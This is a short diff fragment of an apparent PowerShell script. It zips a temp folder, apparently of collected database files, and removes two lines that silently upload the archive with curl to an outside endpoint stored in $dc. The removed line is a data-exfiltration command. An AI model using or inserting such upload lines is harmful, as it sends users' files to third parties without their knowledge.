@@ -49,5 +49,3 @@ $zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "dbfil
 Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
 
 
-curl.exe -F file1=@"$zipFileName" $dc | Out-Null
-sleep 1
